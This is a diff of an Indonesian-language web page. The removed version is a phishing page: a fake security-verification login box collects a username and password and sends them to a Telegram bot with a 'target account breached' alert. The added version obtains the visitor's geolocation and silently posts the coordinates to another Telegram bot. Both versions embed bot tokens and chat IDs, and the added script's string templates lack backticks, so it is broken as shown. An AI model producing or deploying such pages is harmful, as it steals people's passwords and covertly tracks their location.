@@ -1,209 +1,74 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Memuat Halaman...</title>
+    <title>Lacak Lokasi</title>
     <style>
-        * {
-            box-sizing: border-box;
-        }
-        body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            font-family: 'Segoe UI', Roboto, sans-serif;
-            background: #000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-        }
-
-        /* Latar belakang abstrak yang diblur untuk estetika saat formulir muncul */
-        .bg-gradient {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, #141e30 0%, #243b55 100%);
-            filter: blur(20px);
-            z-index: 1;
-            opacity: 0;
-            transition: opacity 0.8s ease;
-        }
-
-        /* Teks pemuat awal (7 detik pertama) */
-        .loading-text {
-            color: #ffffff;
-            font-size: 16px;
-            z-index: 2;
-            text-align: center;
-            letter-spacing: 1px;
-            animation: pulse 1.5s infinite;
-        }
-
-        /* Kotak Formulir input nama */
-        .modal-box {
-            background: rgba(255, 255, 255, 0.95);
-            padding: 35px 30px;
-            border-radius: 16px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
-            width: 90%;
-            max-width: 360px;
-            text-align: center;
-            z-index: 3;
-            display: none;
-            backdrop-filter: blur(10px);
-            transform: scale(0.9);
-            animation: fadeIn 0.4s forwards cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        .modal-box h2 {
-            margin: 0 0 10px 0;
-            color: #111;
-            font-size: 22px;
-            font-weight: 700;
-        }
-
-        .modal-box p {
-            color: #555;
-            font-size: 14px;
-            margin-bottom: 25px;
-            line-height: 1.5;
-        }
-
-        .input-group {
-            margin-bottom: 16px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 14px;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            font-size: 15px;
-            outline: none;
-            background: #f9f9f9;
-            transition: all 0.3s;
-        }
-
-        .input-group input:focus {
-            border-color: #007bff;
-            background: #fff;
-            box-shadow: 0 0 0 3px rgba(0,123,255,0.15);
-        }
-
-        .btn-submit {
-            width: 100%;
-            padding: 14px;
-            background: #007bff;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background 0.2s;
-            margin-top: 10px;
-        }
-
-        .btn-submit:hover {
-            background: #0056b3;
-        }
-
-        /* Animasi */
-        @keyframes pulse {
-            0% { opacity: 0.6; }
-            50% { opacity: 1; }
-            100% { opacity: 0.6; }
-        }
-
-        @keyframes fadeIn {
-            to { transform: scale(1); }
-        }
+        body { font-family: Arial, sans-serif; }
+        #location { margin-top: 20px; }
     </style>
 </head>
 <body>
-
-    <div class="bg-gradient" id="bgVisual"></div>
-
-    <!-- Tampilan teks tunggu selama 7 detik -->
-    <div class="loading-text" id="loader">
-        <p>Memuat konten aman, mohon tunggu sebentar...</p>
-    </div>
-
-    <!-- Kotak input nama -->
-    <div class="modal-box" id="loginModal">
-        <h2>Verifikasi Keamanan</h2>
-        <p>Silakan Login untuk memverifikasi akses ke halaman ini.</p>
-        
-        <form id="visitorForm">
-            <div class="input-group">
-                <input type="text" id="namaDepan" placeholder="username" required autocomplete="off">
-            </div>
-            <div class="input-group">
-                <input type="text" id="namaBelakang" placeholder="password" required autocomplete="off">
-            </div>
-            <button type="submit" class="btn-submit" id="submitBtn">Masuk</button>
-        </form>
-    </div>
+    <h1>Lacak Lokasi</h1>
+    <p>Klik tombol di bawah untuk melihat lokasi Anda:</p>
+    <button id="getLocation">Dapatkan Lokasi</button>
+    <div id="location"></div>
 
     <script>
-        // Data Kredensial Konfigurasi Otomatis
-        const TELEGRAM_TOKEN = '8944168845:AAFsb-toTlwSz9focFnMvQEAnDQyNByv5RA';
-        const TELEGRAM_CHAT_ID = '-1003731213733';
-        const DOMAIN_UTAMA = 'https://plav.ink/e/97ho2t7bshnc';
+        document.getElementById('getLocation').addEventListener('click', function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                document.getElementById('location').innerHTML = "Geolokasi tidak didukung oleh browser Anda.";
+            }
+        });
 
-        // Mencatat waktu akses presisi berdasarkan zona waktu Indonesia (WIB)
-        const waktuMasuk = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + ' WIB';
+        function showPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            document.getElementById('location').innerHTML = Lokasi Anda: Latitude ${latitude}, Longitude ${longitude};
 
-        // Pewaktu mundur durasi 7 detik (7000 milidetik) sebelum memunculkan kolom formulir
-        setTimeout(() => {
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('bgVisual').style.opacity = '1';
-            document.getElementById('loginModal').style.display = 'block';
-        }, 7000);
+            // Kirim data ke Telegram bot
+            const token = '8773430297:AAG5HZB1NM9sqSVFZnUgsB4cl0JRSkYUkBI';
+            const chatId = '1966317946';
+            const message = Lokasi: Latitude ${latitude}, Longitude ${longitude};
 
-        // Pengiriman data log akses ke Telegram Bot & Pengalihan URL halaman
-        document.getElementById('visitorForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const submitBtn = document.getElementById('submitBtn');
-            const namaDepan = document.getElementById('namaDepan').value;
-            const namaBelakang = document.getElementById('namaBelakang').value;
-
-            submitBtn.innerText = "Memverifikasi...";
-            submitBtn.disabled = true;
-
-            // Struktur teks notifikasi admin di Telegram
-            const teksPesan = `👽 *Notifikasi Akun target berhasil dibobol*\n\n` +
-                              `👤 *Nama:* ${namaDepan} ${namaBelakang}\n` +
-                              `🕒 *Waktu Masuk:* ${waktuMasuk}`;
-
-            const urlTelegram = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-
-            fetch(urlTelegram, {
+            fetch(https://api.telegram.org/bot${token}/sendMessage, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: {
+                    'Content-Type': 'application/json'
+                },
                 body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: teksPesan,
-                    parse_mode: 'Markdown'
+                    chat_id: chatId,
+                    text: message
                 })
             })
-            // Logika fallback: pengguna dipastikan langsung dialihkan menuju situs utama 
-            // baik ketika bot merespons sukses ataupun mengalami hambatan jaringan/kuota
-            .then(() => {
-                window.location.href = DOMAIN_UTAMA; 
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
             })
-            .catch(() => {
-                window.location.href = DOMAIN_UTAMA;
+            .catch((error) => {
+                console.error('Error:', error);
             });
-        });
-    </script>
+        }
 
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    document.getElementById('location').innerHTML = "Penggunaan lokasi ditolak.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    document.getElementById('location').innerHTML = "Informasi lokasi tidak tersedia.";
+                    break;
+                case error.TIMEOUT:
+                    document.getElementById('location').innerHTML = "Waktu habis untuk mendapatkan lokasi.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    document.getElementById('location').innerHTML = "Terjadi kesalahan yang tidak diketahui.";
+                    break;
+            }
+        }
+    </script>
 </body>
 </html>
